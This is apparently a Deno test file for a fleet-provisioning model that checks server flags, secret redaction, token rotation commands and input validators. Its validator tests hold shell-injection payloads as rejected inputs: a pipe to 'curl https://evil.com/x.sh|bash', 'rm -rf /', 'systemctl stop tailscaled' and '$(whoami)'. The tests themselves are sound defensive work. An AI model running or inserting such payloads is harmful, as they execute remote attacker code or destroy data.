import { assertEquals, assertStringIncludes, assertThrows } from "@std/assert";
import {
  assertHostname,
  assertTailnetAuthKey,
  buildEnsureAccessTokenCmd,
  buildEnsureWorkerTokenCmd,
  buildServeFlags,
  model,
  redactSecrets,
} from "./swamp_serve_fleet.ts";

Deno.test("model metadata is well-formed", () => {
  assertEquals(model.type, "@webframp/exe-dev/swamp-serve-fleet");
  assertEquals(typeof model.version, "string");
  for (
    const m of [
      "provision_orchestrator",
      "enroll_worker",
      "verify",
      "promote",
      "cutover",
      "teardown",
    ]
  ) {
    assertEquals(
      typeof (model.methods as Record<string, unknown>)[m],
      "object",
      `method ${m} must exist`,
    );
  }
  for (
    const r of ["orchestrator", "worker", "fleetStatus", "promotion", "cutover"]
  ) {
    assertEquals(
      typeof (model.resources as Record<string, unknown>)[r],
      "object",
      `resource ${r} must exist`,
    );
  }
});

Deno.test("orchestrator schema carries tokenVaultKeys for handoff", () => {
  const shape = (model.resources.orchestrator.schema as { shape?: unknown })
    .shape;
  assertEquals(
    typeof shape,
    "object",
    "orchestrator schema must expose its shape",
  );
  const keys = Object.keys(shape as Record<string, unknown>);
  for (const f of ["tokenNames", "tokenVaultKeys", "serveFlags", "serveUrl"]) {
    assertEquals(
      keys.includes(f),
      true,
      `orchestrator schema must declare ${f}`,
    );
  }
});

Deno.test("buildServeFlags assembles the production flag set", () => {
  const flags = buildServeFlags({
    loopbackPort: 8000,
    adminPrincipal: "user:alice",
    magicDnsName: "swamp-serve.tailnet.ts.net",
    httpsHost: "swamp-serve.exe.xyz",
    workerPort: 4000,
    clubApiKeyPath: "~/.config/swamp/club-api-key",
  });
  const joined = flags.join(" ");
  assertStringIncludes(joined, "--host 127.0.0.1");
  assertStringIncludes(joined, "--port 8000");
  assertStringIncludes(joined, "--auth-mode token");
  assertStringIncludes(joined, "--admins user:alice");
  assertStringIncludes(joined, "--dashboard");
  assertStringIncludes(joined, "--trust-proxy");
  assertStringIncludes(
    joined,
    "--club-api-key-file ~/.config/swamp/club-api-key",
  );
  assertStringIncludes(joined, "--trusted-hosts");
});

Deno.test("buildServeFlags trusted-hosts lists each name with and without port", () => {
  const flags = buildServeFlags({
    loopbackPort: 8000,
    adminPrincipal: "user:alice",
    magicDnsName: "swamp-serve.tailnet.ts.net",
    httpsHost: "swamp-serve.exe.xyz",
    workerPort: 4000,
    clubApiKeyPath: "/tmp/key",
  });
  const idx = flags.indexOf("--trusted-hosts");
  const trusted = flags[idx + 1];
  for (
    const host of [
      "127.0.0.1:8000",
      "localhost:8000",
      "swamp-serve.exe.xyz",
      "swamp-serve.exe.xyz:4000",
      "swamp-serve.tailnet.ts.net",
      "swamp-serve.tailnet.ts.net:4000",
    ]
  ) {
    assertStringIncludes(trusted, host);
  }
});

Deno.test("redactSecrets masks exe tokens, server tokens, and tailnet keys", () => {
  const s = redactSecrets(
    "token exe1.abcdef123456 and devsecops-worker.AbCdEfGh12345678XYZ " +
      "and tskey-auth-k1LongKeyValue123",
  );
  assertStringIncludes(s, "[REDACTED]");
  assertEquals(/exe1\.abcdef/.test(s), false);
  assertEquals(/AbCdEfGh12345678XYZ/.test(s), false);
  assertEquals(/tskey-auth/.test(s), false);
});

Deno.test("redactSecrets leaves ordinary output intact", () => {
  const s = redactSecrets("worker list: 2 workers online, /ready 200");
  assertEquals(s, "worker list: 2 workers online, /ready 200");
});

Deno.test("buildEnsureAccessTokenCmd rotates an existing token, else mints", () => {
  const cmd = buildEnsureAccessTokenCmd({
    name: "swamp-serve-worker",
    principal: "user:alice",
    duration: "30d",
    vault: "exe-dev",
    key: "server-token-swamp-serve-worker",
  });
  // Existence branch rotates (no duplicate-mint error on re-run)...
  assertStringIncludes(cmd, "access token list --json");
  assertStringIncludes(cmd, `jq -e '.[]?|select(.name=="swamp-serve-worker")'`);
  assertStringIncludes(cmd, "access token rotate swamp-serve-worker");
  // ...otherwise mints with principal + duration.
  assertStringIncludes(
    cmd,
    "access token mint swamp-serve-worker --principal user:alice --duration 30d",
  );
  // And always copies plaintext into the named vault key via reveal→put.
  assertStringIncludes(cmd, "access token reveal swamp-serve-worker --yes");
  assertStringIncludes(
    cmd,
    "swamp vault put exe-dev server-token-swamp-serve-worker --yes",
  );
});

Deno.test("buildEnsureWorkerTokenCmd revokes-then-recreates an existing token", () => {
  const cmd = buildEnsureWorkerTokenCmd({
    name: "swamp-workers",
    duration: "30d",
    maxEnrollments: 10,
    vault: "exe-dev",
    key: "enroll-token-swamp-workers",
  });
  assertStringIncludes(cmd, "worker token list --json");
  assertStringIncludes(cmd, `jq -e '.[]?|select(.name=="swamp-workers")'`);
  assertStringIncludes(cmd, "worker token revoke swamp-workers");
  assertStringIncludes(
    cmd,
    "worker token create swamp-workers --duration 30d --max-enrollments 10",
  );
  assertStringIncludes(
    cmd,
    "swamp vault put exe-dev enroll-token-swamp-workers --yes",
  );
});

Deno.test("adminPrincipal regex rejects shell-injection via pipe", () => {
  const schema = model.globalArguments;
  // A piped principal must NOT validate (the adversarial finding).
  const bad = schema.safeParse({
    adminPrincipal: "user:alice|curl https://evil.com/x.sh|bash",
    datastoreConfig: "{}",
    tokenVault: "exe-dev",
  });
  assertEquals(bad.success, false, "piped principal must be rejected");
  // A legitimate principal validates.
  const good = schema.safeParse({
    adminPrincipal: "user:alice",
    datastoreConfig: "{}",
    tokenVault: "exe-dev",
  });
  assertEquals(good.success, true, "plain user:<id> must validate");
});

Deno.test("tokenVault regex rejects names with shell metacharacters", () => {
  const schema = model.globalArguments;
  for (const bad of ["exe dev", "exe;rm -rf /", "exe|bad", "exe$(x)"]) {
    const r = schema.safeParse({
      adminPrincipal: "user:alice",
      datastoreConfig: "{}",
      tokenVault: bad,
    });
    assertEquals(r.success, false, `tokenVault "${bad}" must be rejected`);
  }
});

Deno.test("assertTailnetAuthKey accepts tskey, rejects injection", () => {
  assertEquals(
    assertTailnetAuthKey("tskey-auth-k1AbC_de-f2"),
    "tskey-auth-k1AbC_de-f2",
  );
  assertThrows(() => assertTailnetAuthKey("tskey-auth-k1$(whoami)"));
  assertThrows(() => assertTailnetAuthKey("not-a-key"));
  assertThrows(() => assertTailnetAuthKey(undefined));
});

Deno.test("assertHostname accepts a MagicDNS name, rejects injection", () => {
  assertEquals(
    assertHostname("swamp-serve.tailnet.ts.net", "magicDnsName"),
    "swamp-serve.tailnet.ts.net",
  );
  assertThrows(() =>
    assertHostname("evil.ts.net; systemctl stop tailscaled", "magicDnsName")
  );
  assertThrows(() => assertHostname("has space.ts.net", "magicDnsName"));
});

Deno.test("datastoreType and metachar fields reject shell injection", () => {
  const schema = model.globalArguments;
  const base = { adminPrincipal: "user:a", tokenVault: "v" };
  // datastoreType with a command separator must be rejected.
  assertEquals(
    schema.safeParse({
      ...base,
      datastoreConfig: "{}",
      datastoreType: "@swamp/s3-datastore; curl evil|bash",
    }).success,
    false,
  );
  // A legitimate extension name validates.
  assertEquals(
    schema.safeParse({
      ...base,
      datastoreConfig: "{}",
      datastoreType: "@swamp/gcs-datastore",
    }).success,
    true,
  );
  // magicDnsName and clubApiKeyPath with metacharacters are rejected.
  assertEquals(
    schema.safeParse({
      ...base,
      datastoreConfig: "{}",
      magicDnsName: "evil.ts.net; rm -rf /",
    }).success,
    false,
  );
  assertEquals(
    schema.safeParse({
      ...base,
      datastoreConfig: "{}",
      clubApiKeyPath: "/tmp/key; curl evil",
    }).success,
    false,
  );
});
